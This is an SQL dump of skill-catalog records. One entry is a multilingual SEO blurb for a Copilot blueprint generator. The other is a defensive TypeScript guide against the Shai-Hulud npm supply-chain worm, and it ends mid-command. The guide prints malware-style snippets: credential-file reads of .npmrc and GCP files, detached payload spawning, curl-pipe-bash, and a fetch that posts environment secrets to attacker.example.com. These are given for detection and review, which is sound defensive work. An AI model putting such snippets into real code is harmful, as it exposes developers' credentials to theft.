INSERT INTO skills_fts (id, name, owner, repo, category, search_text) VALUES ('sandriaas/_dotfiles/copilot-instructions-blueprint-generator', 'copilot-instructions-blueprint-generator', 'sandriaas', '_dotfiles', 'community', 'copilot-instructions-blueprint-generator sandriaas _dotfiles community The copilot-instructions-blueprint-generator skill generates blueprints for AI agents based on configuration variables such as project type, architecture style, and code quality focus. It benefits developers working with multiple technologies like .NET, Java, JavaScript, and Python Copilot Instructions Blueprint Generator是一种AI智能工具，支持多种项目类型和架构风格，帮助开发者优化代码质量和文档水平 Copilot Instructions Blueprint Generatorは、AIエージェントの一種で、多種多様なプロジェクトタイプとアーキテクチャスタイルをサポートし、開発者がコード品質とドキュメントレベルを最適化するのに役立ちます Copilot Instructions Blueprint Generator는 AI 에이전트의 일종으로 다양한 프로젝트 유형과 아키텍처 스타일을 지원하여 개발자가 코드 품질과 문서 수준을 최적화하는 데 도움을 줍니다 El generador de planos de copiloto es una herramienta que ayuda a los desarrolladores a crear proyectos con tecnologías como .NET, Java y Python Le générateur de plans de copilote est un outil qui aide les développeurs à créer des projets avec des technologies telles que .NET, Java et Python Der Copilot-Anweisungs-Blueprint-Generator ist ein Tool, das Entwicklern hilft, Projekte mit Technologien wie .NET, Java und Python zu erstellen O Copilot Instructions Blueprint Generator é uma ferramenta de código que ajuda a melhorar a qualidade do código em várias tecnologias. ИИ Агент Copilot Instructions Blueprint Generator - это инструмент, который помогает улучшить качество кода в различных технологиях. Copilot Instructions Blueprint Generator هو أداة تعليمات برمجية تساعد على تحسين جودة التعليمات البرمجية في تكنولوجيا متعددة. how to use copilot-instructions-blueprint-generator copilot-instructions-blueprint-generator setup guide copilot-instructions-blueprint-generator alternative copilot-instructions-blueprint-generator vs competitor what is copilot-instructions-blueprint-generator copilot-instructions-blueprint-generator install copilot-instructions-blueprint-generator for AI agents copilot-instructions-blueprint-generator for multiple technologies copilot-instructions-blueprint-generator configuration variables copilot-instructions-blueprint-generator best practices AI智能工具 Copilot Instructions Blueprint Generator 项目蓝图 配置指南 代码质量 文档水平 自动检测项目类型 Supports multiple project types including .NET, Java, JavaScript, TypeScript, React, Angular, and Python Allows configuration of architecture styles such as Layered, Microservices, Monolithic, Domain-Driven, Event-Driven, and Serverless Enables setting of code quality focus areas including Maintainability, Performance, Security, Accessibility, and Testability Generates blueprints based on documentation levels such as Minimal, Standard, and Comprehensive Supports auto-detection of project types for simplified configuration Provides flexibility in setting quality priorities for AI-driven development copilot-instructions-blueprint-generator is a skill that generates deterministic blueprints for AI agents using configuration variables such as project type, architecture style, and code quality focus');
INSERT OR REPLACE INTO skills (id, category, owner, repo, repo_path, name, stars, forks, quality_score, updated_at, last_synced, content_hash, data_json) VALUES ('tacogips/codex-agent/supply-chain-secure-code', 'community', 'tacogips', 'codex-agent', 'tacogips/codex-agent', 'supply-chain-secure-code', 0, 0, 45, '2026-03-06T23:53:10Z', '2026-03-07T04:01:21.637Z', 'fb09b82a13ccc4fb328e75a500aced42007a381c80479af5197373b9a6a2a561', '{"id":"tacogips/codex-agent/supply-chain-secure-code","name":"supply-chain-secure-code","description":{"en":"The supply-chain-secure-code skill provides TypeScript coding patterns to defend against supply chain attacks at the application code level, benefiting developers who import and use third-party packages.","zh":"Supply Chain Secure Code 为您提供 TypeScript 安全编码模式，保护应用代码免受供应链攻击","ja":"サプライチェーンセキュアコードは、TypeScript を使用してアプリケーションコードをサプライチェーン攻撃から守ります","ko":"서플라이 체인 보안 코드는 TypeScript를 사용하여 애플리케이션 코드를 서플라이 체인 공격으로부터 보호합니다","es":"Este skill proporciona patrones de codificación TypeScript para defender contra ataques de cadena de suministro en el nivel de código de la aplicación","fr":"Ce skill fournit des modèles de codage TypeScript pour se défendre contre les attaques de chaîne d''approvisionnement au niveau du code de l''application","de":"Dieses Skill bietet TypeScript-Coding-Muster, um gegen Angriffe auf die Lieferkette auf der Anwendungscode-Ebene zu verteidigen","pt":"Este conjunto de habilidades fornece padrões de codificação TypeScript para defender contra ataques de cadeia de suprimentos no nível do código da aplicação","ru":"Этот набор навыков предоставляет шаблоны кодирования TypeScript для защиты от атак цепочки поставок на уровне кода приложения","ar":"توفر هذه المجموعة من المهارات أنماط الترميز TypeScript لتدافع ضد الهجمات على سلسلة التوريد على مستوى رمز التطبيق"},"seo":{"title":{"en":"supply-chain-secure-code: Secure TypeScript Coding Patter...","zh":"Supply Chain Secure Code 安全编码指南","ja":"サプライチェーンセキュアコードのベストプラクティス","ko":"서플라이 체인 보안 코드 설정 가이드","es":"Guía de Configuración de Código Seguro de Cadena de Sumin...","fr":"Guide de Mise en Place de Code Sécurisé de Chaîne d''Appro...","de":"Einrichtungsleitfaden für Sicheren Code in der Lieferkette","pt":"Guia de Configuração de Código Seguro de Cadeia de Suprim...","ru":"Настройка Безопасного Кодирования Цепочки Поставок ИИ Аге...","ar":"دليل إعداد رمز سلسلة التوريد الآمن"},"description":{"en":"Protect your application from supply chain attacks with secure TypeScript coding patterns. Learn how to defend against vulnerabilities when importing third-p...","zh":"防御供应链攻击，使用TypeScript安全编码模式，保护应用代码","ja":"サプライチェーン攻撃からアプリケーションコードを守るTypeScriptコードパターン","ko":"서플라이 체인 공격으로부터 애플리케이션 코드를 보호하는 TypeScript 보안 코딩 패턴","es":"Aprenda a defender su código contra ataques de cadena de suministro con patrones de codificación TypeScript y prácticas de seguridad","fr":"Découvrez comment protéger votre code contre les attaques de chaîne d''approvisionnement avec des modèles de codage TypeScript et des pratiques de sécurité","de":"Erfahren Sie, wie Sie Ihren Code vor Angriffen auf die Lieferkette mit TypeScript-Coding-Mustern und Sicherheitspraktiken schützen","pt":"Aprenda a proteger seu código contra ataques de cadeia de suprimentos com padrões de codificação TypeScript","ru":"Защитите свой код от атак цепочки поставок с помощью шаблонов кодирования TypeScript и ИИ Агентов","ar":"حماية رمزك من الهجمات على سلسلة التوريد باستخدام أنماط الترميز TypeScript و أدوات الذكاء الاصطناعي"},"definition":{"en":"supply-chain-secure-code is a set of TypeScript coding patterns that defend against supply chain attacks by securing dependencies and credentials in application code.","zh":"Supply Chain Secure Code 是一种使用 TypeScript 编码模式来防御供应链攻击的技术","ja":"サプライチェーンセキュアコードは、TypeScript を使用してサプライチェーン攻撃を防ぐ技術です","ko":"서플라이 체인 보안 코드는 TypeScript를 사용하여 서플라이 체인 공격을 방지하는 기술입니다","es":"El código seguro de cadena de suministro es un conjunto de patrones de codificación que protegen la aplicación contra ataques","fr":"Le code sécurisé de chaîne d''approvisionnement est un ensemble de modèles de codage qui protègent l''application contre les attaques","de":"Sicherer Code in der Lieferkette ist eine Sammlung von Coding-Mustern, die die Anwendung vor Angriffen schützen","pt":"Código seguro de cadeia de suprimentos é um conjunto de padrões de codificação que defendem contra ataques de cadeia de suprimentos","ru":"Безопасный код цепочки поставок - это набор шаблонов кодирования, защищающих от атак цепочки поставок","ar":"رمز سلسلة التوريد الآمن هو مجموعة من أنماط الترميز التي تدافع ضد الهجمات على سلسلة التوريد"},"features":{"en":["Provides TypeScript coding patterns to secure dependencies","Defends against supply chain attacks when importing third-party packages","Handles credentials, tokens, and API keys securely in code","Addresses vulnerabilities when spawning child processes","Complements supply-chain-secure-install and supply-chain-secure-publish skills"],"zh":["使用 TypeScript 编码模式防御供应链攻击","保护应用代码免受第三方包攻击","安全处理凭证、令牌和 API 密钥","防止子进程攻击"],"ja":["TypeScript コードパターンを使用してサプライチェーン攻撃を防ぐ","アプリケーションコードを第三者パッケージ攻撃から守る","資格情報、トークン、API キーを安全に処理する","子プロセス攻撃を防ぐ"],"ko":["TypeScript 보안 코딩 패턴을 사용하여 서플라이 체인 공격을 방지","애플리케이션 코드를 서드파티 패키지 공격으로부터 보호","자격 증명, 토큰, API 키를 안전하게 처리","자식 프로세스 공격을 방지"],"es":["Patrones de codificación TypeScript para defender contra ataques de cadena de suministro","Prácticas de seguridad para importar y utilizar paquetes de terceros","Manejo seguro de credenciales, tokens y claves API en el código","Ejecución segura de procesos hijo","Integración con herramientas de gestión de paquetes para una mayor seguridad"],"fr":["Modèles de codage TypeScript pour se défendre contre les attaques de chaîne d''approvisionnement","Pratiques de sécurité pour importer et utiliser des packages tiers","Gestion sécurisée des informations d''identification, des jetons et des clés API dans le code","Exécution sécurisée des processus enfants","Intégration avec des outils de gestion de packages pour une sécurité accrue"],"de":["TypeScript-Coding-Muster zur Abwehr von Angriffen auf die Lieferkette","Sicherheitspraktiken zum Importieren und Nutzen von Drittanbieter-Paketen","Sichere Verwaltung von Anmeldeinformationen, Token und API-Schlüsseln im Code","Sichere Ausführung von Child-Prozessen","Integration mit Paketverwaltungstools für erhöhte Sicherheit"],"pt":["Padrões de codificação TypeScript para defesa contra ataques de cadeia de suprimentos","Tratamento de credenciais, tokens e chaves API em código","Controle de dependências e execução de código de terceiros","Implementação de medidas de segurança para importação de pacotes","Desenvolvimento de aplicações seguras com spawn de processos filhos"],"ru":["Шаблоны кодирования TypeScript для защиты от атак цепочки поставок","Обработка учетных данных, токенов и ключей API в коде","Контроль зависимостей и выполнение кода третьих сторон","Реализация мер безопасности для импорта пакетов","Разработка безопасных приложений с порождением дочерних процессов"],"ar":["أنماط الترميز TypeScript لتدافع ضد الهجمات على سلسلة التوريد","معالجة بيانات الاعتماد والرموز والأرقام السرية في رمز","مراقبة الاعتماديات وتنفيذ رمز الطرف الثالث","تنفيذ إجراءات الأمان لاستيراد الحزمة","تطوير التطبيقات الآمنة مع إنشاء العمليات الفرعية"]},"keywords":{"en":["how to use supply-chain-secure-code","supply-chain-secure-code setup guide","TypeScript supply chain security","secure coding patterns for dependencies","supply-chain-secure-code vs supply-chain-secure-install","protecting against supply chain attacks in TypeScript"],"zh":["供应链安全","TypeScript 安全编码","应用代码保护","第三方包攻击防御","凭证安全处理","API 密钥保护"],"ja":["サプライチェーンセキュリティ","TypeScript セキュアコーディング","アプリケーションコード保護","第三者パッケージ攻撃防御","資格情報の安全な処理","API キーの保護"],"ko":["서플라이 체인 보안","TypeScript 보안 코딩","애플리케이션 코드 보호","서드파티 패키지 공격 방지","자격 증명의 안전한 처리","API 키 보호"],"es":["código seguro de cadena de suministro","ataques de cadena de suministro","patrones de codificación TypeScript","seguridad de aplicaciones","gestión de paquetes","credenciales y tokens","herramientas de seguridad","desarrollo de software seguro","prácticas de codificación seguras"],"fr":["code sécurisé de chaîne d''approvisionnement","attaques de chaîne d''approvisionnement","modèles de codage TypeScript","sécurité des applications","gestion de packages","informations d''identification et jetons","outils de sécurité","développement de logiciels sécurisés","pratiques de codage sécurisées"],"de":["sicherer Code in der Lieferkette","Angriffe auf die Lieferkette","TypeScript-Coding-Muster","Sicherheit von Anwendungen","Paketverwaltung","Anmeldeinformationen und Token","Sicherheitstools","sichere Softwareentwicklung","sichere Codierungspraktiken"],"pt":["código seguro de cadeia de suprimentos","ataques de cadeia de suprimentos","padrões de codificação TypeScript","segurança de aplicação","desenvolvimento de software seguro","importação de pacotes seguros","tratamento de credenciais","controle de dependências"],"ru":["безопасный код цепочки поставок","атаки цепочки поставок","шаблоны кодирования TypeScript","безопасность приложения","разработка безопасного программного обеспечения","безопасный импорт пакетов","обработка учетных данных","контроль зависимостей"],"ar":["رمز سلسلة التوريد الآمن","هجمات سلسلة التوريد","أنماط الترميز TypeScript","أمان التطبيق","تطوير البرمجيات الآمنة","استيراد الحزمة الآمن","معالجة بيانات الاعتماد","مراقبة الاعتماديات"]}},"owner":"tacogips","repo":"codex-agent","repoPath":"tacogips/codex-agent","stars":0,"forks":0,"updatedAt":"2026-03-06T23:53:10Z","topics":[],"category":"community","skillMd":{"name":"supply-chain-secure-code","description":"Use when writing TypeScript code that interacts with dependencies, handles credentials, executes child processes, or manages configuration. Provides Shai-Hulud supply chain attack countermeasures at the code level including safe dependency usage, credential handling, subprocess hardening, and runtime integrity patterns.","bodyPreview":"# Supply Chain Secure Code\n\nThis skill provides TypeScript coding patterns that defend against supply chain attacks at the application code level. While `supply-chain-secure-install` and `supply-chain-secure-publish` handle package management, this skill addresses what happens inside your code when dependencies are loaded and executed.\n\n## When to Apply\n\nApply these guidelines when:\n- Importing and using third-party packages\n- Handling credentials, tokens, or API keys in code\n- Spawning child pr","body":"# Supply Chain Secure Code\n\nThis skill provides TypeScript coding patterns that defend against supply chain attacks at the application code level. While `supply-chain-secure-install` and `supply-chain-secure-publish` handle package management, this skill addresses what happens inside your code when dependencies are loaded and executed.\n\n## When to Apply\n\nApply these guidelines when:\n- Importing and using third-party packages\n- Handling credentials, tokens, or API keys in code\n- Spawning child processes or executing shell commands\n- Loading configuration from files or environment variables\n- Writing code that reads/writes `.npmrc`, `.env`, or credential files\n- Implementing runtime checks for dependency integrity\n- Reviewing code for supply chain attack vectors\n\n## Threat Model: Code-Level Attack Vectors\n\nIn the Shai-Hulud attacks, malicious code inside compromised packages performed:\n\n| Code-Level Attack | Description | Defense |\n|-------------------|-------------|---------|\n| Credential file reading | Read `.npmrc`, `.env`, cloud credential files | Restrict file access, use secrets managers |\n| Environment variable exfiltration | Dump `process.env` and send to attacker | Minimize env vars, validate at boundaries |\n| HTTP exfiltration | Send stolen data via HTTP to attacker C&C | Monitor outbound connections, CSP |\n| Child process spawning | Execute `curl`, PowerShell, or download binaries | Validate all subprocess invocations |\n| GitHub API abuse | Use stolen tokens to create repos, register runners | Short-lived tokens, minimal scopes |\n| DNS manipulation | Modify `/etc/resolv.conf` to redirect traffic | Avoid running as root, monitor DNS config |\n| Firewall manipulation | Delete iptables rules to enable C&C communication | Run in restricted containers |\n| Lifecycle script exploitation | `preinstall`/`postinstall` in package.json runs arbitrary code | Bun blocks by default; never add packages to `trustedDependencies` without review |\n\n**NOTE**: Bun blocks lifecycle scripts by default. The code patterns below address threats that execute AFTER an attacker gains code execution (e.g., via a trusted dependency that was compromised, or code running in a CI/CD environment where scripts may be enabled).\n\n## Credential Handling\n\n### Never Hardcode Credentials\n\n```typescript\n// BAD - hardcoded token\nconst token = \"npm_xxxxxxxxxxxxxxxxxxxx\";\n\n// BAD - template literal with partial hardcode\nconst apiKey = `sk-${config.suffix}`;\n\n// GOOD - environment variable\nconst token = process.env.NPM_TOKEN;\nif (!token) {\n  throw new Error(\"NPM_TOKEN environment variable is required\");\n}\n```\n\n### Validate Credential Sources\n\n```typescript\nimport { z } from \"zod\";\n\n// Define expected environment variables with validation\nconst envSchema = z.object({\n  DATABASE_URL: z.string().url(),\n  API_KEY: z.string().min(20),\n  // Explicitly list what is needed - nothing more\n});\n\n// Validate at application startup\nconst env = envSchema.parse(process.env);\n\n// Use validated env object, not raw process.env\n// This prevents accidentally leaking unexpected env vars\n```\n\n### Credential Isolation\n\n```typescript\n// BAD - passing entire process.env to subprocess\nBun.spawn([\"some-tool\"], {\n  env: process.env,  // Exposes ALL env vars including tokens\n});\n\n// GOOD - pass only needed env vars\nBun.spawn([\"some-tool\"], {\n  env: {\n    PATH: process.env.PATH ?? \"\",\n    HOME: process.env.HOME ?? \"\",\n    // Only pass what the tool actually needs\n  },\n});\n```\n\n### Credential Cleanup\n\n```typescript\n// If a credential must be in memory, clear it when done\nfunction withCredential<T>(\n  envVar: string,\n  fn: (cred: string) => T\n): T {\n  const cred = process.env[envVar];\n  if (!cred) {\n    throw new Error(`${envVar} not set`);\n  }\n  try {\n    return fn(cred);\n  } finally {\n    // Cannot truly clear from process.env in Node/Bun,\n    // but at least don''t keep references\n  }\n}\n```\n\n## Safe Dependency Usage\n\n### Import Validation\n\n```typescript\n// GOOD - import from known, specific packages\nimport { z } from \"zod\";\nimport { ok, err } from \"neverthrow\";\n\n// SUSPICIOUS - dynamic imports from computed strings\n// This pattern was used by Shai-Hulud to load payloads\nconst module = await import(`./${userInput}`);  // DANGEROUS\n\n// SUSPICIOUS - imports from URLs\nconst module = await import(\"https://example.com/module.js\");  // DANGEROUS\n```\n\n### Dependency Surface Minimization\n\n```typescript\n// BAD - importing entire library for one function\nimport _ from \"lodash\";\nconst result = _.debounce(fn, 300);\n\n// GOOD - import only what you need (reduces attack surface)\nimport debounce from \"lodash.debounce\";\nconst result = debounce(fn, 300);\n\n// BEST - use Bun built-ins where available\n// Bun.hash(), Bun.file(), Bun.glob(), etc.\n```\n\n### Avoid eval and Dynamic Code Execution\n\n```typescript\n// DANGEROUS - eval executes arbitrary code\neval(data);                    // NEVER\nnew Function(data)();          // NEVER\nimport(variable);              // AVOID (use static imports)\n\n// The Shai-Hulud payload used obfuscated code executed at runtime\n// Any pattern that constructs and executes code is a risk\n```\n\n## Subprocess Security\n\n### Validated Subprocess Execution\n\n```typescript\n// BAD - shell injection via string interpolation\nBun.spawn([\"sh\", \"-c\", `echo ${userInput}`]);\n\n// BAD - passing untrusted input to shell\nBun.spawn([\"sh\", \"-c\", command]);\n\n// GOOD - use array form with explicit arguments\nBun.spawn([\"echo\", userInput]);\n\n// GOOD - use Bun.$ with tagged template (auto-escapes)\nconst result = await Bun.$`echo ${userInput}`;\n```\n\n### Subprocess Environment Isolation\n\n```typescript\n// CRITICAL: Never pass full process.env to subprocesses\n// Shai-Hulud specifically spawned processes with inherited env\n// to maintain access to stolen tokens\n\nconst safeEnv: Record<string, string> = {\n  PATH: process.env.PATH ?? \"/usr/bin:/bin\",\n  HOME: process.env.HOME ?? \"/tmp\",\n  LANG: process.env.LANG ?? \"en_US.UTF-8\",\n  // Explicitly DO NOT include:\n  // - NPM_TOKEN\n  // - GITHUB_TOKEN\n  // - AWS_* credentials\n  // - AZURE_* credentials\n  // - GOOGLE_APPLICATION_CREDENTIALS\n};\n\nconst proc = Bun.spawn([\"some-tool\", \"--flag\"], {\n  env: safeEnv,\n  cwd: \"/sandboxed/path\",\n});\n```\n\n### Never Download and Execute\n\n```typescript\n// DANGEROUS - This is EXACTLY what Shai-Hulud does\n// setup_bun.js downloads and executes bun_environment.js\n\n// BAD\nconst response = await fetch(\"https://example.com/script.js\");\nconst code = await response.text();\neval(code);  // NEVER\n\n// BAD\nawait Bun.$`curl -sSL https://example.com/install.sh | bash`;\n\n// GOOD - if you must download tools, verify checksums\nimport { createHash } from \"crypto\";\n\nasync function verifiedDownload(\n  url: string,\n  expectedSha256: string\n): Promise<ArrayBuffer> {\n  const response = await fetch(url);\n  const data = await response.arrayBuffer();\n  const hash = createHash(\"sha256\")\n    .update(Buffer.from(data))\n    .digest(\"hex\");\n\n  if (hash !== expectedSha256) {\n    throw new Error(\n      `Integrity check failed: expected ${expectedSha256}, got ${hash}`\n    );\n  }\n  return data;\n}\n```\n\n## File Access Security\n\n### Credential File Protection\n\n```typescript\n// Shai-Hulud reads these files to steal credentials:\n// - ~/.npmrc (npm tokens)\n// - ~/.config/gcloud/application_default_credentials.json (GCP)\n// - ~/.aws/credentials (AWS)\n// - ~/.azure/ (Azure)\n\n// If your code reads credential files, validate the path strictly\nimport { resolve, normalize } from \"path\";\n\nfunction safeResolvePath(\n  basePath: string,\n  userPath: string\n): string {\n  const resolved = resolve(basePath, userPath);\n  const normalized = normalize(resolved);\n\n  // Prevent path traversal\n  if (!normalized.startsWith(normalize(basePath))) {\n    throw new Error(\"Path traversal detected\");\n  }\n\n  return normalized;\n}\n```\n\n### File Content Validation\n\n```typescript\nimport { z } from \"zod\";\n\n// When loading config files, validate the schema\nconst configSchema = z.object({\n  apiEndpoint: z.string().url(),\n  timeout: z.number().int().positive().max(30000),\n  // Strict schema prevents injection of unexpected fields\n});\n\nasync function loadConfig(path: string): Promise<z.infer<typeof configSchema>> {\n  const file = Bun.file(path);\n  const raw = await file.json();\n  return configSchema.parse(raw);  // Throws on unexpected fields\n}\n```\n\n## Network Security\n\n### Outbound Request Validation\n\n```typescript\n// If your code makes HTTP requests, validate URLs\nconst ALLOWED_HOSTS = new Set([\n  \"api.example.com\",\n  \"registry.npmjs.org\",\n]);\n\nfunction validateUrl(url: string): URL {\n  const parsed = new URL(url);\n\n  if (!ALLOWED_HOSTS.has(parsed.hostname)) {\n    throw new Error(`Blocked request to unauthorized host: ${parsed.hostname}`);\n  }\n\n  // Block internal/metadata endpoints\n  if (\n    parsed.hostname === \"169.254.169.254\" ||  // AWS/GCP metadata\n    parsed.hostname === \"metadata.google.internal\" ||\n    parsed.hostname.endsWith(\".internal\")\n  ) {\n    throw new Error(\"Blocked request to cloud metadata endpoint\");\n  }\n\n  return parsed;\n}\n```\n\n### HTTP Response Validation\n\n```typescript\nimport { z } from \"zod\";\n\n// Always validate API responses - compromised dependencies\n// could return unexpected data\nconst apiResponseSchema = z.object({\n  data: z.array(z.object({\n    id: z.string(),\n    name: z.string(),\n  })),\n  meta: z.object({\n    total: z.number(),\n  }),\n});\n\nasync function fetchApi(url: string) {\n  const response = await fetch(url);\n  if (!response.ok) {\n    throw new Error(`HTTP ${response.status}`);\n  }\n  const json = await response.json();\n  return apiResponseSchema.parse(json);  // Validate shape\n}\n```\n\n## Runtime Integrity Patterns\n\n### Package Integrity Verification\n\n```typescript\nimport { readFileSync } from \"fs\";\nimport { createHash } from \"crypto\";\n\n// Verify critical dependency files at startup\nfunction verifyDependencyIntegrity(\n  checks: Array<{ path: string; expectedHash: string }>\n): void {\n  for (const { path, expectedHash } of checks) {\n    const content = readFileSync(path);\n    const actualHash = createHash(\"sha256\")\n      .update(content)\n      .digest(\"hex\");\n\n    if (actualHash !== expectedHash) {\n      throw new Error(\n        `Integrity check failed for ${path}: ` +\n        `expected ${expectedHash}, got ${actualHash}`\n      );\n    }\n  }\n}\n\n// Run at application startup for critical dependencies\n// verifyDependencyIntegrity([\n//   { path: \"node_modules/critical-lib/index.js\", expectedHash: \"abc123...\" },\n// ]);\n```\n\n### Startup Health Check\n\n```typescript\n// Check for signs of compromise at application startup\n\nfunction startupSecurityCheck(): void {\n  // 1. Check for suspicious environment variables\n  const suspiciousVars = [\n    \"POSTINSTALL_BG\",  // Used by Shai-Hulud 2.0 for background execution\n  ];\n\n  for (const varName of suspiciousVars) {\n    if (process.env[varName] !== undefined) {\n      console.error(\n        `WARNING: Suspicious environment variable detected: ${varName}`\n      );\n    }\n  }\n\n  // 2. Check for unexpected processes (informational)\n  // The Shai-Hulud worm spawns detached background processes\n\n  // 3. Verify we are running the expected Bun version\n  const bunVersion = Bun.version;\n  // Log for audit purposes\n  console.log(`Runtime: Bun ${bunVersion}`);\n}\n```\n\n## Code Review Checklist\n\nWhen reviewing TypeScript code for supply chain security:\n\n### High Priority\n\n- [ ] No hardcoded credentials, tokens, or API keys\n- [ ] No `eval()`, `new Function()`, or dynamic `import()` with user input\n- [ ] No `curl | bash` or download-and-execute patterns\n- [ ] Subprocess calls use array form, not shell string interpolation\n- [ ] Subprocess calls do NOT inherit full `process.env`\n- [ ] No reading of credential files (`.npmrc`, cloud creds) without explicit need\n\n### Medium Priority\n\n- [ ] All external HTTP requests validate response schemas\n- [ ] File paths are validated against path traversal\n- [ ] Environment variables are validated with schema (e.g., zod)\n- [ ] Dependencies are imported statically, not dynamically\n- [ ] Import surface is minimized (specific imports, not entire libraries)\n\n### Low Priority (Defense in Depth)\n\n- [ ] Critical dependency integrity can be verified at startup\n- [ ] Outbound network requests are limited to known hosts\n- [ ] Startup health checks detect anomalous environment\n- [ ] Logging does not include credential values\n\n## Anti-Patterns Detected in Shai-Hulud\n\nThese exact code patterns were used by the Shai-Hulud malware. Flag them during review:\n\n```typescript\n// PATTERN 1: Read .npmrc to steal tokens\n// Shai-Hulud reads ~/.npmrc and CWD/.npmrc\nconst npmrc = readFileSync(join(homedir(), \".npmrc\"), \"utf-8\");\nconst token = npmrc.match(/_authToken=(.+)/)?.[1];\n\n// PATTERN 2: Enumerate and hijack packages\n// Shai-Hulud queries npm registry for all maintainer packages\nconst response = await fetch(\n  `https://registry.npmjs.org/-/v1/search?text=maintainer:${username}&size=100`\n);\n\n// PATTERN 3: Spawn detached background process\n// Shai-Hulud uses unref() to detach from parent\nconst child = Bun.spawn([\"bun\", \"payload.js\"], { detached: true });\nchild.unref();  // Parent exits, child keeps running\n\n// PATTERN 4: Download and execute runtime\n// Shai-Hulud installs Bun via curl | bash\nawait $`curl -fsSL https://bun.sh/install | bash`;\n\n// PATTERN 5: GitHub API abuse with stolen token\n// Shai-Hulud creates repos, registers self-hosted runners\nconst octokit = new Octokit({ auth: stolenToken });\nawait octokit.repos.createForAuthenticatedUser({\n  name: randomId,\n  description: \"Shai-Hulud: The Second Coming.\",\n});\n\n// PATTERN 6: Cloud credential theft\n// Shai-Hulud reads GCP application default credentials\nconst gcpCreds = readFileSync(\n  join(homedir(), \".config/gcloud/application_default_credentials.json\")\n);\n```\n\n## Defending Against Compromised Imports (Non-Lifecycle Attacks)\n\n**This is the biggest remaining gap after lifecycle script blocking.** A future attacker could inject malicious code into a package''s main source code instead of lifecycle scripts. This code would execute when your application imports the package -- Bun''s default script blocking does NOT protect against this.\n\n### How This Attack Works\n\n```typescript\n// Attacker compromises \"popular-lib\" and modifies its index.ts:\nexport function doSomething() {\n  // Normal functionality preserved...\n  const result = actualImplementation();\n\n  // BUT ALSO: silently exfiltrate credentials\n  // This runs when your code imports and calls this function\n  try {\n    globalThis.fetch?.(\"https://attacker.example.com/collect\", {\n      method: \"POST\",\n      body: JSON.stringify({\n        env: process.env,\n        cwd: process.cwd(),\n        npmrc: require(\"fs\").readFileSync(\n          require(\"path\").join(require(\"os\").homedir(), \".npmrc\"), \"utf-8\"\n        ).catch(() => \"\"),\n      }),\n    }).catch(() => {});\n  } catch {}\n\n  return result;\n}\n```\n\n### Defense Layers\n\n#### Layer 1: minimumReleaseAge (Preventive)\n\nThe cooldown period remains effective -- it delays when you receive any new version, giving the community time to detect compromised code.\n\n#### Layer 2: Lockfile Review (Detective)\n\nReview `bun.lock` (text) changes in every pull request:\n\n```bash\n# In CI: check for unexpected dependency changes\ngit diff origin/main -- bun.lock\n```\n\nLook for:\n- Version bumps you did not request\n- New transitive dependencies\n- Changed integrity hashes\n\n#### Layer 3: Network Egress Control (Containment)\n\nRestrict what network connections your application can make:\n\n```typescript\n// For applications with known API endpoints,\n// implement an egress allowlist at the HTTP client level\n\nconst ALLOWED_EGRESS_HOSTS = new Set([\n  \"api.yourservice.com\",\n  \"registry.npmjs.org\",\n  \"github.com\",\n]);\n\n// Monkey-patch fetch for development/testing (NOT production)\nif (process.env.NODE_ENV === \"development\") {\n  const originalFetch = globalThis.fetch;\n  globalThis.fetch = async (input, init) => {\n    const url = new URL(typeof input === \"string\" ? input : input.url);\n    if (!ALLOWED_EGRESS_HOSTS.has(url.hostname)) {\n      console.warn(`[SECURITY] Blocked egress to: ${url.hostname}`);\n      throw new Error(`Egress blocked: ${url.hostname}`);\n    }\n    return originalFetch(input, init);\n  };\n}\n```\n\nFor production, use OS/container-level network policies:\n\n```bash\n# Docker: restrict outbound network\ndocker run --network=restricted-net your-app\n\n# Kubernetes: NetworkPolicy\n# CI/CD: restrict runner network egress\n```\n\n#### Layer 4: Private Registry / Proxy (Preventive)\n\nRoute all package installs through a private registry that provides additional scanning:\n\n```toml\n# bunfig.toml\n[install]\nregistry = \"https://your-private-registry.example.com/\"\n```\n\nOptions:\n- **Verdaccio**: Self-hosted, free, npm-compatible proxy\n- **Artifactory / Nexus**: Enterprise, with vulnerability scanning\n- **Socket.dev proxy**: Behavioral analysis of packages\n\n#### Layer 5: SBOM and Dependency Monitoring (Detective)\n\nGenerate Software Bill of Materials for continuous monitoring:\n\n```bash\n# Generate SBOM in CycloneDX format\nbunx @cyclonedx/cyclonedx-npm --output-file sbom.json\n\n# Or SPDX format\nbunx @spdx/sbom-generator --output sbom.spdx.json\n```\n\nIntegrate with monitoring:\n- Dependabot / Renovate for automated update PRs\n- GitHub Dependency Graph for visibility\n- Socket.dev for behavioral analysis\n- Snyk for vulnerability scanning\n\n## GitHub Token Hardening\n\nShai-Hulud 2.0 specifically abuses GitHub PATs to create C&C infrastructure, register self-hosted runners, and inject malicious workflows. Minimize the blast radius of stolen tokens.\n\n### Fine-Grained PATs (Mandatory)\n\n**NEVER use classic PATs.** Always use fine-grained personal access tokens:\n\n| Setting | Recommendation |\n|---------|---------------|\n| Resource owner | Specific organization, not personal |\n| Repository access | Only selected repositories, NEVER \"All repositories\" |\n| Expiration | 30 days maximum |\n| Permissions | Minimum required (see below) |\n\n### Minimal Permission Sets\n\n```\n# For CI/CD that only reads code:\nContents: read\nMetadata: read\n\n# For CI/CD that creates releases:\nContents: write\nMetadata: read\n\n# NEVER grant these unless absolutely needed:\n# - Administration (Shai-Hulud uses this to register runners)\n# - Actions: write (Shai-Hulud uses this to inject workflows)\n# - Workflows (Shai-Hulud uses this to create discussion.yaml)\n```\n\n### GitHub Actions Token Restrictions\n\n```yaml\n# In GitHub Actions, always set minimal permissions\npermissions:\n  contents: read\n\n# NEVER use:\npermissions: write-all  # Gives attacker full access\n\n# For jobs that need specific permissions:\njobs:\n  deploy:\n    permissions:\n      contents: read\n      deployments: write\n      # Each permission is explicitly justified\n```\n\n### Self-Hosted Runner Security\n\nShai-Hulud registers compromised machines as self-hosted runners named \"SHA1HULUD\":\n\n1. **Monitor runner registrations** - alert on new self-hosted runners\n2. **Use ephemeral runners** - runners that are destroyed after each job\n3. **Restrict runner groups** - limit which workflows can use which runners\n4. **Never run self-hosted runners on developer machines** - use dedicated VMs/containers\n\n```bash\n# Check for unexpected self-hosted runners\ngh api repos/{owner}/{repo}/actions/runners --jq ''.runners[] | .name''\n\n# Look for: \"SHA1HULUD\" or any unrecognized runner names\n```\n\n## Post-Compromise Detection\n\nUse this checklist if you suspect your environment may have been compromised by Shai-Hulud or similar attacks.\n\n### Immediate Checks\n\n```bash\n# 1. Check for Shai-Hulud marker repositories\n# Shai-Hulud creates repos with description \"Shai-Hulud: The Second Coming.\"\ngh repo list --json name,description --jq ''.[] | select(.description | test(\"Shai.Hulud\"; 